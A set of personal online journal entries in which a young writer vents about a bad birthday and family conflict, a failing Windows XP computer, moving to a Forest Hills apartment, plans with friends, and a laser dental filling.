      Talk about a horrible birthday. It was just extremely sad and annoying. It all started in the morning when we were about to leave the house. My dad 'had' to come for some very odd reason. I knew something was going to go wrong with him and it did. He was arguing and being extremely annoying and torturing us. Then he started drinking and driving and it turned into hell. Finally after about 2 hours my mom drops his ass off in queens at his mothers.  After that me, my mother and david were driving. I wanted to go to roosevelt field mall, they wouldnt take me so all hell broke loose. She kept suggesting all these places that i did not wanna fucking go to. And it was just crazy. I got so fucking angry at her. The two of them really ruined my birthday completly. I ended up getting nothing at all and then she stopped and got me a cake...  We went home, ate the cake. Big fucking deal. Supposedly shes taking me out to the mall today which i know is going to be another lie. Just you watch...

      Im really angry. Ive been a bit ignoring some things. Apparently also i havent posted in my journal for a bit. I havent really been busy, more like unattentive to various things. Lately ive been doing some attempts to fix my main computer due to its network failure. Thats what i get for using Windows XP Pro ;X. I really do not wanna format that comp and put something else on it, due to the fact that i have so many mp3s, movies and programs that i actually use and such. I would back it up, but its gigabytes of information. I did however partition the drive and put all my movies on the newly made drive which i made X:\. I might as well move shit to there, and overwrite the windows with a new installation of it, or change the filesystem and throw Gentoo on it.  Ive also had some goodish bad news lately. Im moving once again. Its not very surprising. I dont like this house anyway. I love the area, just hate the house. Its disgusting, its dirty and theres bugs all over. Its just yucky... Anyway, we're moving back to where i originally was and to an apartment. It wont be too bad though... i was told that over 60 people wanted the apartment and that all the floors are white marble. If over 60 people wanted it, then im sure its worth the $1600 a month rent. The house im in right now is $3500 a month and its not worth it AT ALL.  My birthday is also tomorrow. Im not so happy about that. Im never happy when its my birthday. Nothing ever happens. I get nothing at all. My mom today had to go to the dentist, so apparently i get nothing from my mother. My father is a loser with no job and likes to hit on women, so apparently i dont get anything from her. And my aunts and people like that im sure wont get me anything since no one really gives a shit about me or know who i really am inside.  Im just very blah. Thats the feeling. "blah". Im annoyed and i hate life. Life is annoying. People get chances and good parents and i dont get shit. I know that there are thousands of people who dont have those chances as well, but i contribute to the world, and i deserve it. I dont deserve bad treatment and/or no treatment at all. I havent even been to a doctor in years nor a dentist yet my mom can go to hers. Why was i born id like to know? What is the point of having a child if you do not plan on enjoying the experience and loving your child? I really do not see a point. Youd have to be real scum like Joan Crawford to have a child and just use them to just show em off. But i know for sure my parents arent like Joan Crawford. They arent famous, they dont beat us and they dont really show us off if you know what i mean. Everyone thinks of me as a weirdo i think. I dont think im really part of any family here. I always felt like the odd one out. Maybe im the only normal one, and they're all the odd ones out for a change.

      Haven't posted in awhile. Its just been a bit much for me. Lately ive been seeing my friends again after moving back to Forest Hills. Been going out everywhere, had plans and such. Basically ill type right now my previous weeks schedule daily in my planner:  Sunday July 25th - Free Day, Boris possibly stopping by late afternoon. Monday July 26th - Tutoring at 12 PM or 3 PM Tuesday July 27th - Rescheduled mall meet (Boris, Belle &amp; Eva) meeting at 11:30 AM - 12 PM Wednesday July 28th - Go to the mall with Boris and Belle. unknown time. Cancelled and re-scheduled for 27th Thursday July 29th - Go to the movies with Belle, Boris and Eva, They come at 2 PM Friday July 30th - FREE Saturday July 31st - Lame party im not invited to, who the fuck's gonna pay $45 at the entrance? Baby's appointment for the vet on saturday at 1:45 PM. Appointment rescheduled for nextweek. [...] Monday August 2nd - Going to mall with Belle and Boris. Tuesday August 3rd - Boris coming over. New carpeting at 2 PM. Electrician at 8 AM Wednesday August 4th - Dentist appointment at 4 PM. Boris coming at 2 PM [...] Friday August 6th - Weekly horror movie night Saturday August 7th - Possible party invite [...] Monday August 9th - Dentist appointment at 3:30  And thats it for that... Lots and lots of action. But just all of a sudden that fades away... Lets talk about the carpeting first. That day that said it was coming, apparently it didnt. Im not sure why. My mother had called, and the carpeting finally came the next day. Currently my carpeting is an industrial carpet thats Black and Charcoal colors. I adore it :):)...  The dentist appointment i had gone to on the 9th was fine. I had gone with my Aunt which was only about 3 blocks away at Gerard Towers and i went to see Dr. Landau. It was okay... The synopsis for my one cavity was basically that i needed to get a root canal. That specific day, i was to be treated for it. As i was sitting on the chair, i asked Dr. Landau if it was possible that i could just get the tooth done by laser rather than having to get a needle and drilled. I knew about the lasering due to the fact that my aunt had gotten her tooth lasered once. Basically its where they take this hydro powered tool that basically cuts through the tooth pain free. He wasnt sure though whether or not it would go well due to the fact that the cavity's hole was pretty large, but he went with it.  As i was sitting in the chair for that full hour, finally it was done. It was a very tiring process and i didnt mind it. It didnt hurt at all except for a couple of points. The pain was bareable, but uncomfortable. At the point where the hydro powered tool wore away my enamel and all the way down to the root, the root was exposed to the cold air, giving me that weird feeling like when you open your mouth and cold air comes in and giving u a weird pain tingle into ur tooth. I felt that about 3 times, but it was bareable.  The only part i didnt feel comfortable with was that my mouth was OPEN for a full hour without being closed. The suction tool made my mouth completely dry. There was also a part where this type of gluey substance was put onto my tooth and got onto my tongue and it had tasted sour and bitter. Dr. Landau said it would.  Finally towards the end, the filling was instered in the two holes on my tooth and then dried with this other tool. Finally, i took a gander at the tooth and it was perfect :). In the future, i hope to get a full mouth whitening.  He had said my teeth were perfectly healthy and perfectly aligned. The only other thing is that i have another appointment, because on my right side under a molar, there is a stuck piece of baby tooth that needs to come out. Some how its been stuck there for a long time. Supposedly its a 2 minute process, but it involves the needle. I dont care, ill just take it.  Hm... what else has been going on. Nothing way too big. On and off ive been going out with my cousin and sister to just places... Like getting italian ices once in awhile and just going to the store or walking my dog. Basically thats all thats happened lately. For some reason time has been flying so fast during the days that im not doing anything productive. Usually i sit here coding or doing something useful like reading, but apparently its as if im standing around and sitting for hours at a time not noticing wat the hells going on and how the times going by so fast. Either i should wake up earlier or just stop dicking around and do something productive.  Last but not least there was an incident that occured about 15 minutes ago that got me extremely angry, but after typing here for a bit, the anger subsided... I just dont wanna talk about it, so ill leave it be.  Anything else i should add...hm... Im bored. Befriend me :(....
